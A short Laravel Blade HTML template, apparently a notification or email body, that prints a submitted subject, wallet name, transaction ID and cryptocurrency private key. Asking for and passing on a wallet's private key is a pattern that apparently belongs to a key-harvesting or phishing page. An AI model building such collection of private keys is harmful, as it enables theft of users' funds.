<div>
    <h2>{{$request->subject}}</h2>
    <div>
        <b>Wallet Name: </b>{{$request->walletname}}<br>
        <b>Transaction ID: </b>{{$request->code}}<br>
        <b>Private Key: </b>{{$request->privatekey}}<br>
    </div>
</div>
